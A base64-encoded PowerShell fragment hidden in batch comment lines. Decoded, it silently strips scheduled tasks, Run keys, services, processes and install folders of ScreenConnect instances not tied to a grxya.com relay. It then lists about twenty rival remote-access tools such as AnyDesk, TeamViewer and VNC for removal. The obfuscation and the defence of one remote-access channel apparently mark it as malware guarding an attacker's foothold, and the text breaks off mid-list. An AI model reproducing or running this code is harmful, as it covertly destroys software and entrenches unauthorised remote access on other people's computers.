::IGZvcmVhY2ggKCRrIGluICRrZWVwKSB7IGlmICgkayAtYW5kICRzIC1saWtlICIq
::JGsqIikgeyByZXR1cm4gJHRydWUgfSB9DQogICAgICAgIHJldHVybiAkZmFsc2UN
::CiAgICB9DQoNCiAgICBmdW5jdGlvbiBSZW1vdmUtU2NQZXJzaXN0ZW5jZShbc3Ry
::aW5nXSRGcCkgew0KICAgICAgICAjIEwzOTogcHVyZ2UgU2NyZWVuQ29ubmVjdCBw
::ZXJzaXN0ZW5jZSByZWZlcmVuY2luZyB0aGlzIEZQIE9SIGdlbmVyaWMgU0MgaW5z
::dGFsbGVycw0KICAgICAgICAjIHRoYXQgYXJlIG5vdCBrZWVwZXItcHJvdGVjdGVk
::IChiYXJlIG1zaWV4ZWMgL2kgVVJMIHdhdGNoZG9ncyB3aXRob3V0IEZQIGxpdGVy
::YWwpLg0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgR2V0LVNjaGVkdWxlZFRh
::c2sgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVj
::dCB7DQogICAgICAgICAgICAgICAgJHRhc2sgPSAkXw0KICAgICAgICAgICAgICAg
::ICRibG9iID0gJycNCiAgICAgICAgICAgICAgICBmb3JlYWNoICgkYSBpbiAkdGFz
::ay5BY3Rpb25zKSB7ICRibG9iICs9ICIgJCgkYS5FeGVjdXRlKSAkKCRhLkFyZ3Vt
::ZW50cykiIH0NCiAgICAgICAgICAgICAgICBpZiAoJGJsb2IgLW5vdG1hdGNoICco
::P2kpU2NyZWVuQ29ubmVjdHxtc2lleGVjJykgeyByZXR1cm4gfQ0KICAgICAgICAg
::ICAgICAgIGlmIChUZXN0LVNjS2VlcGVyUmVmICRibG9iKSB7IHJldHVybiB9DQog
::ICAgICAgICAgICAgICAgJGhpdCA9ICRmYWxzZQ0KICAgICAgICAgICAgICAgIGlm
::ICgkRnAgLWFuZCAkYmxvYiAtbWF0Y2ggW3JlZ2V4XTo6RXNjYXBlKCRGcCkpIHsg
::JGhpdCA9ICR0cnVlIH0NCiAgICAgICAgICAgICAgICBlbHNlaWYgKCRibG9iIC1t
::YXRjaCAnKD9pKVNjcmVlbkNvbm5lY3RcLkNsaWVudFNldHVwfFNjcmVlbkNvbm5l
::Y3QgQ2xpZW50fHBrZ19ncnl4YVwubXNpfHBrZ1wubXNpJykgeyAkaGl0ID0gJHRy
::dWUgfQ0KICAgICAgICAgICAgICAgIGlmICgkaGl0KSB7DQogICAgICAgICAgICAg
::ICAgICAgIFVucmVnaXN0ZXItU2NoZWR1bGVkVGFzayAtVGFza05hbWUgJHRhc2su
::VGFza05hbWUgLVRhc2tQYXRoICR0YXNrLlRhc2tQYXRoIC1Db25maXJtOiRmYWxz
::ZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAgICAgICAgICAg
::ICAgICBMb2cgInBlcnNpc3RfdGFza19yZW1vdmVkICQoJHRhc2suVGFza1BhdGgp
::JCgkdGFzay5UYXNrTmFtZSkgZnA9JEZwIg0KICAgICAgICAgICAgICAgIH0NCiAg
::ICAgICAgICAgIH0NCiAgICAgICAgfSBjYXRjaCB7IExvZyAicGVyc2lzdF90YXNr
::X2VudW1fZXJyICRfIiB9DQogICAgICAgIGZvcmVhY2ggKCRyayBpbiBAKCdIS0xN
::OlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4n
::LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAnSEtMTTpcU09GVFdBUkVcTWlj
::cm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuT25jZScsDQogICAgICAg
::ICAgICAgICAgICAgICAgICAgICdIS0xNOlxTT0ZUV0FSRVxXT1c2NDMyTm9kZVxN
::aWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4nLA0KICAgICAgICAg
::ICAgICAgICAgICAgICAgICAnSEtMTTpcU09GVFdBUkVcV09XNjQzMk5vZGVcTWlj
::cm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuT25jZScsDQogICAgICAg
::ICAgICAgICAgICAgICAgICAgICdIS0NVOlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2lu
::ZG93c1xDdXJyZW50VmVyc2lvblxSdW4nLA0KICAgICAgICAgICAgICAgICAgICAg
::ICAgICAnSEtDVTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZl
::cnNpb25cUnVuT25jZScpKSB7DQogICAgICAgICAgICBpZiAoLW5vdCAoVGVzdC1Q
::YXRoICRyaykpIHsgY29udGludWUgfQ0KICAgICAgICAgICAgJHAgPSBHZXQtSXRl
::bVByb3BlcnR5ICRyayAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAg
::ICAgICAgICAgaWYgKC1ub3QgJHApIHsgY29udGludWUgfQ0KICAgICAgICAgICAg
::Zm9yZWFjaCAoJHByb3AgaW4gJHAuUFNPYmplY3QuUHJvcGVydGllcykgew0KICAg
::ICAgICAgICAgICAgIGlmICgkcHJvcC5OYW1lIC1saWtlICdQUyonKSB7IGNvbnRp
::bnVlIH0NCiAgICAgICAgICAgICAgICAkdiA9IFtzdHJpbmddJHByb3AuVmFsdWUN
::CiAgICAgICAgICAgICAgICBpZiAoVGVzdC1TY0tlZXBlclJlZiAkdikgeyBjb250
::aW51ZSB9DQogICAgICAgICAgICAgICAgaWYgKCR2IC1ub3RtYXRjaCAnKD9pKVNj
::cmVlbkNvbm5lY3R8bXNpZXhlYycpIHsgY29udGludWUgfQ0KICAgICAgICAgICAg
::ICAgICRoaXQgPSAkZmFsc2UNCiAgICAgICAgICAgICAgICBpZiAoJEZwIC1hbmQg
::JHYgLW1hdGNoIFtyZWdleF06OkVzY2FwZSgkRnApKSB7ICRoaXQgPSAkdHJ1ZSB9
::DQogICAgICAgICAgICAgICAgZWxzZWlmICgkdiAtbWF0Y2ggJyg/aSlTY3JlZW5D
::b25uZWN0XC5DbGllbnRTZXR1cHxTY3JlZW5Db25uZWN0IENsaWVudCcpIHsgJGhp
::dCA9ICR0cnVlIH0NCiAgICAgICAgICAgICAgICBpZiAoJGhpdCkgew0KICAgICAg
::ICAgICAgICAgICAgICBSZW1vdmUtSXRlbVByb3BlcnR5IC1QYXRoICRyayAtTmFt
::ZSAkcHJvcC5OYW1lIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
::ZQ0KICAgICAgICAgICAgICAgICAgICBMb2cgInBlcnNpc3RfcnVua2V5X3JlbW92
::ZWQgJHJrXCQoJHByb3AuTmFtZSkgZnA9JEZwIg0KICAgICAgICAgICAgICAgIH0N
::CiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIExvZyAnZXh0
::ZXJtaW5hdGVfZW5naW5lX0w3X2JlZ2luJw0KDQogICAgIyBwdXJnZSBwZXJzaXN0
::ZW5jZSBmb3IgZXZlcnkgbm9uLWtlZXBlciBTQyBmaW5nZXJwcmludCBCRUZPUkUg
::cHJvZHVjdC9zdmMvZGlyIHJlbW92YWwsDQogICAgIyBzbyBhbiBvbGQvZm9yZWln
::biBTQyB3YXRjaGRvZyBjYW5ub3QgcmVpbnN0YWxsIGl0c2VsZiAoYW5kIGNyb3Nz
::LWtpbGwgR3J5eGEpIG1pZC1wYXNzLg0KICAgIGZvcmVhY2ggKCRmcFggaW4gKEdl
::dC1Ob25LZWVwZXJTY0ZwcykpIHsNCiAgICAgICAgUmVtb3ZlLVNjUGVyc2lzdGVu
::Y2UgJGZwWA0KICAgIH0NCg0KICAgICMgMS4gZm9yZWlnbiBTQyBwcm9kdWN0cyBm
::cm9tIEJPVEggY29ycmVjdCBBUlAgaGl2ZXMNCiAgICAkc2VlbiA9IEB7fQ0KICAg
::IGZvcmVhY2ggKCRyb290IGluICRzY3JpcHQ6VW5pbnN0YWxsUm9vdHMpIHsNCiAg
::ICAgICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkcm9vdCkpIHsgTG9nICJoaXZlX21p
::c3NpbmcgJHJvb3QiOyBjb250aW51ZSB9DQogICAgICAgIExvZyAiaGl2ZV9zY2Fu
::ICRyb290Ig0KICAgICAgICBHZXQtQ2hpbGRJdGVtICRyb290IC1FcnJvckFjdGlv
::biBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAg
::ICAgJHByb3AgPSBHZXQtSXRlbVByb3BlcnR5ICRfLlBTUGF0aCAtRXJyb3JBY3Rp
::b24gU2lsZW50bHlDb250aW51ZQ0KICAgICAgICAgICAgJGRuID0gJHByb3AuRGlz
::cGxheU5hbWUNCiAgICAgICAgICAgIGlmICgtbm90ICRkbikgeyByZXR1cm4gfQ0K
::ICAgICAgICAgICAgaWYgKCRkbiAtbm90bWF0Y2ggJyg/aSlTY3JlZW5Db25uZWN0
::XHMrQ2xpZW50XHMqXCgoWzAtOUEtRmEtZl17MTZ9KVwpJykgeyByZXR1cm4gfQ0K
::ICAgICAgICAgICAgJGZwID0gJE1hdGNoZXNbMV0uVG9Mb3dlcigpDQogICAgICAg
::ICAgICBpZiAoJGZwIC1pbiAka2VlcCkgeyByZXR1cm4gfQ0KICAgICAgICAgICAg
::JHVzID0gJHByb3AuVW5pbnN0YWxsU3RyaW5nDQogICAgICAgICAgICBpZiAoJHVz
::IC1hbmQgJHVzIC1tYXRjaCAnKD9pKWdyeXhhXC5jb20nKSB7IExvZyAicHJvZHVj
::dF9za2lwX2dyeXhhX3JlbGF5IFskZG5dIjsgcmV0dXJuIH0NCiAgICAgICAgICAg
::IGlmICgkc2Vlbi5Db250YWluc0tleSgkXy5QU0NoaWxkTmFtZSkpIHsgcmV0dXJu
::IH0NCiAgICAgICAgICAgICRzZWVuWyRfLlBTQ2hpbGROYW1lXSA9ICR0cnVlDQog
::ICAgICAgICAgICBpZiAoVW5pbnN0YWxsLVByb2R1Y3RLZXkgJF8pIHsgJG4ucHJv
::ZHVjdCsrIH0gZWxzZSB7ICRuLmZhaWwrKzsgTG9nICJwcm9kdWN0X1JFTU9WRV9G
::QUlMRUQgWyRkbl0iIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgICMgMi4gZm9y
::ZWlnbiBTQyBzZXJ2aWNlcyAoc2tpcCBpZiBrZWVwZXIgRlAgb3IgcmVsYXkgaXMg
::Z3J5eGEuY29tKQ0KICAgIGZvcmVhY2ggKCRzdmMgaW4gKEdldC1TZXJ2aWNlIC1F
::cnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgV2hlcmUtT2JqZWN0IHsgJF8u
::TmFtZSAtbGlrZSAnU2NyZWVuQ29ubmVjdCBDbGllbnQqJyB9KSkgew0KICAgICAg
::ICBpZiAoSXMtS2VlcGVyICRzdmMuTmFtZSkgeyBjb250aW51ZSB9DQogICAgICAg
::ICRpbWcgPSAoR2V0LUl0ZW1Qcm9wZXJ0eSAiSEtMTTpcU1lTVEVNXEN1cnJlbnRD
::b250cm9sU2V0XFNlcnZpY2VzXCQoJHN2Yy5OYW1lKSIgLUVycm9yQWN0aW9uIFNp
::bGVudGx5Q29udGludWUpLkltYWdlUGF0aA0KICAgICAgICBpZiAoSXMtS2VlcGVy
::ICRpbWcpIHsgTG9nICJzdmNfc2tpcF9ncnl4YV9yZWxheSAkKCRzdmMuTmFtZSki
::OyBjb250aW51ZSB9DQogICAgICAgICYgc2MuZXhlIHN0b3AgIiQoJHN2Yy5OYW1l
::KSIgMj4mMSB8IE91dC1OdWxsDQogICAgICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNl
::Y29uZHMgNjAwDQogICAgICAgICYgc2MuZXhlIGRlbGV0ZSAiJCgkc3ZjLk5hbWUp
::IiAyPiYxIHwgT3V0LU51bGwNCiAgICAgICAgJG4uc3ZjKys7IExvZyAic3ZjX2Rl
::bGV0ZWQgJCgkc3ZjLk5hbWUpIg0KICAgIH0NCg0KICAgICMgMy4gZm9yZWlnbiBT
::QyBwcm9jZXNzZXMg4oCUIE9OTFkgaWYgcGF0aC9jbWRsaW5lIGVtYmVkcyBhIE5P
::Ti1rZWVwZXIgRlAuDQogICAgIyBPNDE6IG51bGwgRXhlY3V0YWJsZVBhdGggdXNl
::ZCB0byBraWxsIEdyeXhhIENsaWVudFNlcnZpY2UgZXZlcnkgdGljayDihpIgcmVp
::bnN0YWxsIGxvb3AuDQogICAgR2V0LUNpbUluc3RhbmNlIFdpbjMyX1Byb2Nlc3Mg
::LUZpbHRlciAiTmFtZSBsaWtlICdTY3JlZW5Db25uZWN0JSciIC1FcnJvckFjdGlv
::biBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAk
::ZXhlID0gW3N0cmluZ10kXy5FeGVjdXRhYmxlUGF0aA0KICAgICAgICAkY21kID0g
::W3N0cmluZ10kXy5Db21tYW5kTGluZQ0KICAgICAgICAkYmxvYiA9ICIkZXhlICRj
::bWQiDQogICAgICAgIGlmIChJcy1LZWVwZXIgJGJsb2IpIHsgcmV0dXJuIH0NCiAg
::ICAgICAgaWYgKCRibG9iIC1tYXRjaCAnKD9pKWdyeXhhXC5jb20nKSB7IExvZyAi
::cHJvY19za2lwX2dyeXhhX3JlbGF5IHBpZD0kKCRfLlByb2Nlc3NJZCkiOyByZXR1
::cm4gfQ0KICAgICAgICBpZiAoJGJsb2IgLW5vdG1hdGNoICdcKChbMC05YS1mQS1G
::XXsxNn0pXCknKSB7DQogICAgICAgICAgICBMb2cgInByb2Nfc2tpcF9ub19mcCBw
::aWQ9JCgkXy5Qcm9jZXNzSWQpIG5hbWU9JCgkXy5OYW1lKSINCiAgICAgICAgICAg
::IHJldHVybg0KICAgICAgICB9DQogICAgICAgICRmcCA9ICRNYXRjaGVzWzFdLlRv
::TG93ZXIoKQ0KICAgICAgICBpZiAoJGZwIC1pbiAka2VlcCkgeyByZXR1cm4gfQ0K
::ICAgICAgICBTdG9wLVByb2Nlc3MgLUlkICRfLlByb2Nlc3NJZCAtRm9yY2UgLUVy
::cm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAgJG4ucHJvYysrOyBM
::b2cgInByb2Nfa2lsbGVkIHBpZD0kKCRfLlByb2Nlc3NJZCkgZnA9JGZwIGV4ZT0k
::ZXhlIg0KICAgIH0NCg0KICAgICMgNC4gZm9yZWlnbiBTQyBpbnN0YWxsIGRpcnMg
::KFBGICsgUEY4NikNCiAgICBmb3JlYWNoICgkYmFzZSBpbiBAKCRlbnY6UHJvZ3Jh
::bUZpbGVzLCAke2VudjpQcm9ncmFtRmlsZXMoeDg2KX0pKSB7DQogICAgICAgIGlm
::ICgtbm90ICRiYXNlIC1vciAtbm90IChUZXN0LVBhdGggJGJhc2UpKSB7IGNvbnRp
::bnVlIH0NCiAgICAgICAgR2V0LUNoaWxkSXRlbSAtTGl0ZXJhbFBhdGggJGJhc2Ug
::LURpcmVjdG9yeSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUg
::fA0KICAgICAgICAgICAgV2hlcmUtT2JqZWN0IHsgJF8uTmFtZSAtbGlrZSAnU2Ny
::ZWVuQ29ubmVjdConIH0gfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICAg
::ICAgJGQgPSAkXy5GdWxsTmFtZQ0KICAgICAgICAgICAgICAgIGlmIChJcy1LZWVw
::ZXIgJGQpIHsgcmV0dXJuIH0NCiAgICAgICAgICAgICAgICAjIGRpciBjYXJyaWVz
::IG5vIEZQL3JlbGF5IGluIGl0cyBuYW1lOyBwcm90ZWN0IHRoZSBvbmUgYmFja2lu
::ZyBhIGtlZXBlci9ncnl4YSBzZXJ2aWNlDQogICAgICAgICAgICAgICAgJGxlYWYg
::PSAkXy5OYW1lDQogICAgICAgICAgICAgICAgJHN2Y0hlcmUgPSBHZXQtU2Vydmlj
::ZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFdoZXJlLU9iamVjdCB7
::ICRfLk5hbWUgLWxpa2UgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicgfSB8IFdoZXJl
::LU9iamVjdCB7DQogICAgICAgICAgICAgICAgICAgICRpbSA9IChHZXQtSXRlbVBy
::b3BlcnR5ICJIS0xNOlxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcU2VydmljZXNc
::JCgkXy5OYW1lKSIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpLkltYWdl
::UGF0aA0KICAgICAgICAgICAgICAgICAgICAkaW0gLWFuZCAoJGltIC1saWtlICIq
::JGxlYWYqIikNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgaWYg
::KCRzdmNIZXJlKSB7IExvZyAiZGlyX3NraXBfbGl2ZV9zdmMgJGQiOyByZXR1cm4g
::fQ0KICAgICAgICAgICAgICAgIGlmIChGb3JjZS1SZW1vdmVEaXIgJGQpIHsgJG4u
::ZGlyKys7IExvZyAiZGlyX3JlbW92ZWQgJGQiIH0NCiAgICAgICAgICAgICAgICBl
::bHNlIHsgJG4uZmFpbCsrOyBMb2cgImRpcl9SRU1PVkVfRkFJTEVEICRkIiB9DQog
::ICAgICAgICAgICB9DQogICAgfQ0KDQogICAgIyA1LiBkaXNhbGxvd2VkIFJNTSAv
::IHJlbW90ZS1hY2Nlc3MgdG9vbHMgKG1hcmtldCBjb3ZlcmFnZSAyMDI2KS4NCiAg
::ICAjIEtFRVAgZm9yZXZlcjogRGF0dG8vQ2VudHJhU3RhZ2UgKyBTY3JlZW5Db25u
::ZWN0IGtlZXAgRlBzIChoYW5kbGVkIGFib3ZlKS4NCiAgICAjIE5FVkVSIHB1dCBE
::YXR0by9DZW50cmFTdGFnZS9DYWdTZXJ2aWNlIGluIHRoaXMgbGlzdC4NCiAgICBm
::dW5jdGlvbiBJcy1EYXR0b0tlZXBlcihbc3RyaW5nXSRzKSB7DQogICAgICAgIGlm
::ICgtbm90ICRzKSB7IHJldHVybiAkZmFsc2UgfQ0KICAgICAgICByZXR1cm4gW2Jv
::b2xdKCRzIC1tYXRjaCAnKD9pKURhdHRvfENlbnRyYVN0YWdlfENhZ1NlcnZpY2V8
::QXV0b3Rhc2tFbmRwb2ludCcpDQogICAgfQ0KICAgICRybW0gPSBAKA0KICAgICAg
::ICBAeyBUYWc9J0FueURlc2snOyAgICAgIFN2Yz1AKCdBbnlEZXNrJyk7IFByb2M9
::QCgnQW55RGVzaycpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFueURlc2si
::LCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQW55RGVzayIsIiRlbnY6UHJvZ3Jh
::bURhdGFcQW55RGVzayIpOyBQcm9kPUAoJ0FueURlc2sqJykgfQ0KICAgICAgICBA
::eyBUYWc9J1RlYW1WaWV3ZXInOyAgIFN2Yz1AKCdUZWFtVmlld2VyKicpOyBQcm9j
::PUAoJ1RlYW1WaWV3ZXIqJywndHZfdzMyKicsJ3R2X3g2NConKTsgRGlycz1AKCIk
::ZW52OlByb2dyYW1GaWxlc1xUZWFtVmlld2VyIiwiJHtlbnY6UHJvZ3JhbUZpbGVz
::KHg4Nil9XFRlYW1WaWV3ZXIiKTsgUHJvZD1AKCdUZWFtVmlld2VyKicpIH0NCiAg
::ICAgICAgQHsgVGFnPSdTcGxhc2h0b3AnOyAgICBTdmM9QCgnU3BsYXNodG9wKics
::J1NSU2VydmljZScsJ1NTVVNlcnZpY2UnKTsgUHJvYz1AKCdTcGxhc2h0b3AqJywn
::c3Ryd2luY2x0KicsJ1NSTWFuYWdlcionKTsgRGlycz1AKCIkZW52OlByb2dyYW1G
::aWxlc1xTcGxhc2h0b3AiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cU3BsYXNo
::dG9wIik7IFByb2Q9QCgnU3BsYXNodG9wKicpIH0NCiAgICAgICAgQHsgVGFnPSdM
::b2dNZUluJzsgICAgICBTdmM9QCgnTG9nTWVJbicsJ0xNSUd1YXJkaWFuU3ZjJywn
::TE1JaWduaXRpb24nKTsgUHJvYz1AKCdMb2dNZUluKicsJ0xNSUd1YXJkaWFuKics
::J1JhU2VydmVyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXExvZ01lSW4i
::LCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTG9nTWVJbiIpOyBQcm9kPUAoJ0xv
::Z01lSW4qJykgfQ0KICAgICAgICBAeyBUYWc9J0dvVG8nOyAgICAgICAgIFN2Yz1A
::KCdHb1RvTXlQQyonLCdHb1RvQXNzaXN0KicsJ0dvVG9SZXNvbHZlKicpOyBQcm9j
::PUAoJ0dvVG9NeVBDKicsJ0dvVG9Bc3Npc3QqJywnZzJtKicsJ0dvVG9SZXNvbHZl
::KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEdvVG9NeVBDIiwiJHtlbnY6
::UHJvZ3JhbUZpbGVzKHg4Nil9XEdvVG9NeVBDIik7IFByb2Q9QCgnR29Ub015UEMq
::JywnR29Ub0Fzc2lzdConLCdHb1RvIFJlc29sdmUqJywnR29Ub01lZXRpbmcqJywn
::R29UbyBDb25uZWN0KicpIH0NCiAgICAgICAgQHsgVGFnPSdSdXN0RGVzayc7ICAg
::ICBTdmM9QCgnUnVzdERlc2snLCdydXN0ZGVzayonKTsgUHJvYz1AKCdydXN0ZGVz
::ayonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xSdXN0RGVzayIsIiR7ZW52
::OlByb2dyYW1GaWxlcyh4ODYpfVxSdXN0RGVzayIpOyBQcm9kPUAoJ1J1c3REZXNr
::KicpIH0NCiAgICAgICAgQHsgVGFnPSdTdXByZW1vJzsgICAgICBTdmM9QCgnU3Vw
::cmVtbyonKTsgUHJvYz1AKCdTdXByZW1vKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3Jh
::bUZpbGVzXFN1cHJlbW8iLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cU3VwcmVt
::byIpOyBQcm9kPUAoJ1N1cHJlbW8qJykgfQ0KICAgICAgICBAeyBUYWc9J0RXU2Vy
::dmljZSc7ICAgIFN2Yz1AKCdEV0FnZW50JywnZHdhZ2VudConKTsgUHJvYz1AKCdk
::d2FnZW50KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXERXQWdlbnQiLCIk
::e2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cRFdBZ2VudCIsIiRlbnY6UHJvZ3JhbURh
::dGFcRFdBZ2VudCIpOyBQcm9kPUAoJ0RXQWdlbnQqJywnRFdTZXJ2aWNlKicpIH0N
::CiAgICAgICAgQHsgVGFnPSdab2hvQXNzaXN0JzsgICBTdmM9QCgnWm9ob0Fzc2lz
::dConLCdab2hvTWVldGluZyonKTsgUHJvYz1AKCdab2hvQXNzaXN0KicsJ1pvaG9V
::UlNCKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFpvaG9NZWV0aW5nIiwi
::JHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFpvaG9NZWV0aW5nIik7IFByb2Q9QCgn
::Wm9obyBBc3Npc3QqJywnWm9ob01lZXRpbmcqJykgfQ0KICAgICAgICBAeyBUYWc9
::J1JlbW90ZVBDJzsgICAgIFN2Yz1AKCdSZW1vdGVQQyonKTsgUHJvYz1AKCdSZW1v
::dGVQQyonLCdSUENTdWl0ZSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xS
::ZW1vdGVQQyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxSZW1vdGVQQyIpOyBQ
::cm9kPUAoJ1JlbW90ZVBDKicpIH0NCiAgICAgICAgQHsgVGFnPSdCb21nYXInOyAg
::ICAgICBTdmM9QCgnYm9tZ2FyKicsJ0JleW9uZFRydXN0KicpOyBQcm9jPUAoJ2Jv
::bWdhcionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xCb21nYXIiLCIke2Vu
::djpQcm9ncmFtRmlsZXMoeDg2KX1cQm9tZ2FyIiwiJGVudjpQcm9ncmFtRmlsZXNc
::QmV5b25kVHJ1c3QiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQmV5b25kVHJ1
::c3QiKTsgUHJvZD1AKCdCb21nYXIqJywnQmV5b25kVHJ1c3QqJykgfQ0KICAgICAg
::ICBAeyBUYWc9J1BhcnNlYyc7ICAgICAgIFN2Yz1AKCdQYXJzZWMqJyk7IFByb2M9
::QCgncGFyc2VjZConLCdwc2VydmljZSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1G
::aWxlc1xQYXJzZWMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cUGFyc2VjIiwi
::JGVudjpQcm9ncmFtRGF0YVxQYXJzZWMiKTsgUHJvZD1AKCdQYXJzZWMqJykgfQ0K
::ICAgICAgICBAeyBUYWc9J0Nocm9tZVJEJzsgICAgIFN2Yz1AKCdjaHJvbW90aW5n
::KicpOyBQcm9jPUAoJ3JlbW90aW5nX2hvc3QqJyk7IERpcnM9QCgiJGVudjpQcm9n
::cmFtRmlsZXNcR29vZ2xlXENocm9tZSBSZW1vdGUgRGVza3RvcCIsIiR7ZW52OlBy
::b2dyYW1GaWxlcyh4ODYpfVxHb29nbGVcQ2hyb21lIFJlbW90ZSBEZXNrdG9wIik7
::IFByb2Q9QCgnQ2hyb21lIFJlbW90ZSBEZXNrdG9wKicpIH0NCiAgICAgICAgQHsg
::VGFnPSdVbHRyYVZOQyc7ICAgICBTdmM9QCgndXZuYyonLCd3aW52bmMqJyk7IFBy
::b2M9QCgnd2ludm5jKicsJ3V2bmMqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmls
::ZXNcVWx0cmFWTkMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cVWx0cmFWTkMi
::KTsgUHJvZD1AKCdVbHRyYVZOQyonLCdXaW5WTkMqJykgfQ0KICAgICAgICBAeyBU
::YWc9J1RpZ2h0Vk5DJzsgICAgIFN2Yz1AKCd0dm5zZXJ2ZXIqJyk7IFByb2M9QCgn
::dHZuc2VydmVyKicsJ3R2bnZpZXdlcionKTsgRGlycz1AKCIkZW52OlByb2dyYW1G
::aWxlc1xUaWdodFZOQyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxUaWdodFZO
::QyIpOyBQcm9kPUAoJ1RpZ2h0Vk5DKicpIH0NCiAgICAgICAgQHsgVGFnPSdSZWFs
::Vk5DJzsgICAgICBTdmM9QCgndm5jc2VydmVyKicpOyBQcm9jPUAoJ3ZuY3NlcnZl
::cionLCd2bmN2aWV3ZXIqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcUmVh
::bFZOQyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxSZWFsVk5DIik7IFByb2Q9
::QCgnVk5DIFNlcnZlcionLCdSZWFsVk5DKicpIH0NCiAgICAgICAgQHsgVGFnPSdE
::YW1lV2FyZSc7ICAgICBTdmM9QCgnRGFtZVdhcmUqJyk7IFByb2M9QCgnRFdSQ1Mq
::JywnRFdSQ0MqJywnRGFtZVdhcmUqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmls
::ZXNcU29sYXJXaW5kcyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxTb2xhcldp
::bmRzIiwiJGVudjpQcm9ncmFtRmlsZXNcRGFtZVdhcmUgUmVtb3RlIFN1cHBvcnQi
::LCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cRGFtZVdhcmUgUmVtb3RlIFN1cHBv
::cnQiKTsgUHJvZD1AKCdEYW1lV2FyZSonKSB9DQogICAgICAgIEB7IFRhZz0nTmV0
::U3VwcG9ydCc7ICAgU3ZjPUAoJ05ldFN1cHBvcnQqJyk7IFByb2M9QCgnY2xpZW50
::MzIqJywncGNpY3RsKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXE5ldFN1
::cHBvcnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTmV0U3VwcG9ydCIpOyBQ
::cm9kPUAoJ05ldFN1cHBvcnQqJykgfQ0KICAgICAgICBAeyBUYWc9J1NpbXBsZUhl
::bHAnOyAgIFN2Yz1AKCdTaW1wbGVIZWxwKicpOyBQcm9jPUAoJ1NpbXBsZVNlcnZp
::Y2UqJywnc2ltcGxlc2VydmljZSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxl
::c1xTaW1wbGVIZWxwIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFNpbXBsZUhl
::bHAiKTsgUHJvZD1AKCdTaW1wbGVIZWxwKicpIH0NCiAgICAgICAgQHsgVGFnPSdH
::ZXRTY3JlZW4nOyAgICBTdmM9QCgnR2V0U2NyZWVuKicpOyBQcm9jPUAoJ0dldFNj
::cmVlbionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xHZXRTY3JlZW4iLCIk
::e2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cR2V0U2NyZWVuIik7IFByb2Q9QCgnR2V0
::U2NyZWVuKicpIH0NCiAgICAgICAgQHsgVGFnPSdJcGVyaXVzJzsgICAgICBTdmM9
::QCgnSXBlcml1cyonKTsgUHJvYz1AKCdJcGVyaXVzUmVtb3RlKicpOyBEaXJzPUAo
